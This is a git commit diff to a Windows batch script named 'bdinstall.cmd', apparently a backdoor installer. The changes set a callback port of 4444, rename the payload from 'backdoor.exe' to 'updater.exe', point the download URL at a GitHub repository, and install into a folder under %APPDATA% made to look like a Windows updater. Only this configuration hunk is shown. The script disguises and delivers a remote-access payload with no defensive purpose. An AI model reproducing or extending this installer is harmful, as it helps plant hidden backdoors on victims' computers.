47b04785134b03fec23f14c003926fd5002ce292
H4ck3r-netizen <caspiansk8@gmail.com>
2025-02-17 12:32:56 +0100

    Update bdinstall.cmd

--- bdinstall.cmd
+++ bdinstall.cmd
@@ -8,10 +8,10 @@
 setlocal enableDelayedExpansion
 
 REM Change these to your server's IP and file location
-set LHOST=[YOUR_IP]
-set LPORT=[YOUR_PORT]
-set FILENAME=backdoor.exe
-set FILEURL=http://%LHOST%/%FILENAME%
+set LHOST=
+set LPORT=4444
+set FILENAME='updater.exe'
+set FILEURL='https://github.com/H4ck3r-netizen/BD'
 set INSTALLDIR=%APPDATA%\Microsoft\Windows\Updater
 
 REM Create installation directory
